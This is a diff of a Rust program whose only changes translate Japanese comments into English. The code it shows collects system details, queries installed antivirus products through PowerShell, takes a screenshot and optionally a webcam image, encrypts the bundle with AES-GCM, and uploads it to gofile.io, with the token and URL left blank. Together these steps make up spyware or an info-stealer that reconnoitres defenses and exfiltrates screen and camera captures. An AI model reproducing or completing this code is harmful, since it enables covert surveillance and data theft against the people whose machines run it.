@@ -64,7 +64,7 @@ fn get_system_info() -> SystemInfo {
         .text()
         .unwrap_or_default();
 
-    // Antivirus (Windowsのみ)
+    // Antivirus software (Windows only)
     let security_software = get_antivirus_software();
 
     SystemInfo {
@@ -81,9 +81,9 @@ fn get_system_info() -> SystemInfo {
     }
 }
 
-// Windows限定: WMI経由でセキュリティ製品名取得
+// Windows only: retrieve security product names via WMI
 fn get_antivirus_software() -> Vec<String> {
-    // WMIは公式crateではやや未整備。ここではpowershellから取得例
+    // Official WMI crates are limited, so fetch via PowerShell here
     if cfg!(windows) {
         let output = Command::new("powershell")
             .args([
@@ -104,7 +104,7 @@ fn get_antivirus_software() -> Vec<String> {
 }
 
 fn get_screenshot_base64() -> String {
-    // scrap は Windows/macOS/X11 に対応。Wayland では別途設定が必要な場合があります。
+    // scrap supports Windows/macOS/X11; Wayland may require additional setup
     let display = match scrap::Display::primary() {
         Ok(d) => d,
         Err(_) => return String::new(),
@@ -116,19 +116,19 @@ fn get_screenshot_base64() -> String {
 
     let (w, h) = (capturer.width(), capturer.height());
 
-    // フレーム取得（初回は WouldBlock が出やすいので数回リトライ）
+    // Capture frames (retry a few times because the first call often returns WouldBlock)
     for _ in 0..10u8 {
         match capturer.frame() {
             Ok(frame) => {
-                // scrap のピクセルは BGRX/BGRA。PNG 用に RGBA へ並び替え。
-                let stride = w * 4; // 1ピクセル4バイト想定
+                // scrap pixels are BGRX/BGRA; reorder to RGBA for PNG
+                let stride = w * 4; // Assume 4 bytes per pixel
                 let mut rgba = Vec::with_capacity(w * h * 4);
                 for y in 0..h {
                     let start = y * stride;
                     let end = start + stride;
                     let row = &frame[start..end];
                     for px in row.chunks_exact(4) {
-                        // B, G, R, X(A) -> R, G, B, A(=255)
+                        // Convert B, G, R, X(A) to R, G, B, A (=255)
                         rgba.push(px[2]);
                         rgba.push(px[1]);
                         rgba.push(px[0]);
@@ -165,7 +165,7 @@ fn get_screenshot_base64() -> String {
     String::new()
 }
 
-// Webカメラ画像（OpenCV、feature `webcam` 有効時のみ）
+// Webcam image capture (OpenCV, only when the 'webcam' feature is enabled)
 #[cfg(feature = "webcam")]
 fn get_webcam_image_base64() -> String {
     use opencv::{core, imgcodecs, prelude::*, videoio};
@@ -193,13 +193,13 @@ fn get_webcam_image_base64() -> String {
     general_purpose::STANDARD.encode(buf.to_vec())
 }
 
-// `webcam` フィーチャー無効時は空文字を返す
+// Return an empty string when the 'webcam' feature is disabled
 #[cfg(not(feature = "webcam"))]
 fn get_webcam_image_base64() -> String {
     String::new()
 }
 
-// 実際のAES-GCM暗号化
+// Perform the actual AES-GCM encryption
 fn encrypt_data(data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Result<Vec<u8>, String> {
     let cipher = Aes256Gcm::new(aes_gcm::Key::<Aes256Gcm>::from_slice(key));
     let ciphertext = cipher.encrypt(Nonce::from_slice(nonce), data)
@@ -208,39 +208,39 @@ fn encrypt_data(data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Result<Vec<u8>
 }
 
 fn main() {
-    // 1. システム情報取得
+    // 1. Gather system information
     let system_info = get_system_info();
 
-    // 2. スクリーンショット取得
+    // 2. Capture screenshot
     let screenshot_base64 = get_screenshot_base64();
 
-    // 3. Webカメラ画像取得
+    // 3. Capture webcam image
     let webcam_image_base64 = get_webcam_image_base64();
 
-    // 4. シリアライズ
+    // 4. Serialize data
     let info_msgpack = to_msgpack_vec(&system_info).unwrap();
     let image_msgpack = to_msgpack_vec(&serde_json::json!({
         "screenshot": screenshot_base64,
         "webcam_image": webcam_image_base64,
     })).unwrap();
 
-    // 5. 暗号化
+    // 5. Encrypt data
     let mut rng = rand::rng();
     let mut key = [0u8; 32];
     let mut nonce = [0u8; 12];
     rng.fill(&mut key);
     rng.fill(&mut nonce);
     
-    // AES-GCM暗号化（必須）
+    // AES-GCM encryption (mandatory)
     let encrypted_info = encrypt_data(&info_msgpack, &key, &nonce)
-        .map_err(|e| panic!("システム情報の暗号化に失敗しました: {}", e))
+        .map_err(|e| panic!("Failed to encrypt system information: {}", e))
         .unwrap();
     let encrypted_images = encrypt_data(&image_msgpack, &key, &nonce)
-        .map_err(|e| panic!("画像データの暗号化に失敗しました: {}", e))
+        .map_err(|e| panic!("Failed to encrypt image data: {}", e))
         .unwrap();
 
-    // 6. キーとデータを分離して保存
-    // キーファイルを保存
+    // 6. Store the key and encrypted data separately
+    // Save the key file
     let key_data = serde_json::json!({
         "key": general_purpose::STANDARD.encode(&key),
         "nonce": general_purpose::STANDARD.encode(&nonce),
@@ -249,25 +249,25 @@ fn main() {
     let key_msgpack = to_msgpack_vec(&key_data).unwrap();
     let mut key_file = File::create("key.bin").unwrap();
     key_file.write_all(&key_msgpack).unwrap();
-    println!("AES-256キーを保存: key.bin");
+    println!("Saved AES-256 key: key.bin");
     
-    // データファイル（キーなし）
+    // Save the data file (without the key)
     let final_data = to_msgpack_vec(&serde_json::json!({
         "info": general_purpose::STANDARD.encode(&encrypted_info),
         "images": general_purpose::STANDARD.encode(&encrypted_images),
-        "encrypted": true,  // 新形式では常にtrue
+        "encrypted": true,  // Always true in the new format
     })).unwrap();
 
     let mut f = File::create("data.dat").unwrap();
     f.write_all(&final_data).unwrap();
 
-    // 7. gofile.ioへアップロード（reqwest）
+    // 7. Upload to gofile.io (using reqwest)
     upload_to_gofile("data.dat");
 }
 
 fn upload_to_gofile(file_path: &str) {
     let url = "";
-    let token = ""; // 要更新
+    let token = ""; // Needs to be updated
     let folder_id = "";
     let client = Client::new();
 
